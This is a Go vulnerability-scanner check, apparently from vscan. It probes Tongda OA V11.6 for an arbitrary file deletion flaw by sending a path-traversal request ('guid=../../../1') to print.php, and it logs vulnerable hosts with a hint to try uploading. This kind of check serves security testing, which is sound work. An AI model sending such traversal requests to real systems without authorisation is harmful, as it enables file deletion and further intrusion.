package tongda

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//version 通达 OA V11.6 任意文件删除
func File_delete(url string) bool{
	if req, err := pkg.HttpRequset(url+"/module/appbuilder/assets/print.php?guid=../../../1", "GET", "", false, nil); err == nil {
		if strings.Contains(req.Body,"未知参数"){
			pkg.GoPocLog(fmt.Sprintf("Found tongda-OA file delete in print.php you can try to upload|%s\n", url))
			return true
		}
	}
	return false
}
